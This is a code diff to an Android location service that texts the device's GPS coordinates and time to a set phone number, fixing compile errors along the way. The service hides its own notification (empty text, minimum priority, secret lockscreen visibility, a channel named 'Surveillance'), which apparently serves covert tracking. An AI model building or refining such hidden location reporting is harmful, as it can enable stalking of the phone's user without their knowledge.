@@ -9,6 +9,7 @@ import android.os.*
 import android.telephony.SmsManager
 import android.widget.Toast
 import androidx.core.app.NotificationCompat
+import androidx.core.app.NotificationManagerCompat
 import org.osmdroid.util.GeoPoint
 import java.text.SimpleDateFormat
 import java.util.*
@@ -99,7 +100,8 @@ class LocationService : Service() {
         val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
         val message = "MYSAFE:$lat:$lon:$time:${myPhoneNumber.takeLast(4)}"
         try {
-            smsManager.sendDataMessage(targetPhoneNumber, null, byteArrayOf(0, 0), message.toByteArray(Charsets.UTF_8), null, null)
+            // ✅ Corrigé : port = 0 (Short), pas ByteArray
+            smsManager.sendDataMessage(targetPhoneNumber, null, 0.toShort(), message.toByteArray(Charsets.UTF_8), null, null)
         } catch (e: Exception) {
             try { smsManager.sendTextMessage(targetPhoneNumber, null, message, null, null) } catch (e2: Exception) {}
         }
@@ -123,8 +125,11 @@ class LocationService : Service() {
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val chan = NotificationChannel("MYSAFE_SVC", "Surveillance", NotificationManager.IMPORTANCE_MIN).apply {
-                setShowBadge(false); enableVibration(false); enableLights(false)
-                lockScreenVisibility = Notification.VISIBILITY_SECRET
+                setShowBadge(false)
+                enableVibration(false)
+                enableLights(false)
+                // ✅ Corrigé : utiliser la bonne constante
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
         }
@@ -133,10 +138,16 @@ class LocationService : Service() {
     private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, "MYSAFE_SVC")
             .setSmallIcon(android.R.drawable.ic_menu_compass)
-            .setContentTitle("").setContentText("").setSilent(true)
+            .setContentTitle("")
+            .setContentText("")
+            .setSilent(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET).build()
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .build()
     }
 
-    override fun onDestroy() { super.onDestroy(); stopMonitoring() }
+    override fun onDestroy() {
+        super.onDestroy()
+        stopMonitoring()
+    }
 }
